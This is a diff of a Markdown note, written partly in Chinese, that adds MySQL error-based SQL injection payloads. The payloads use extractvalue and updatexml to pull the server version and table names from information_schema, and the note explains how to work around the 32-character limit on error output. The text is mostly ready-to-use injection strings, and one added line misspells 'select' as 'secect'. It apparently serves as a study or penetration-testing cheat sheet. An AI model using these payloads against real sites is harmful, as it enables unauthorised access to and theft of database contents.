@@ -25,7 +25,15 @@
 and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2))) %23
 select version()可替换 select table_name from information_schema.tables where table_schema=database() limit 0,1
 ```
+####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: and extractvalue(1, payload)
+```sql
+and extractvalue(1, concat(0x7e,(select @@version),0x7e)) and updatexml(1,concat(0x23,(select table_name from information_schema.tables where table_schema='newblog' limit 0,1),0x23),1)
+```
 ![](/assets/22F086091F949BB64B59D97865EFE310.png)
+####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: and updatexml(1,payload,1)
+```sql
+    and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)
+```
 ![](/assets/26024E61529BC7DF606D3641DB676AAB.png)
 
 **注意: [其他报错方式](https://www.waitalone.cn/mysql-error-based-injection.html)、报错返回会有32限制(采用substr(concat(内容),1,2)截取)**
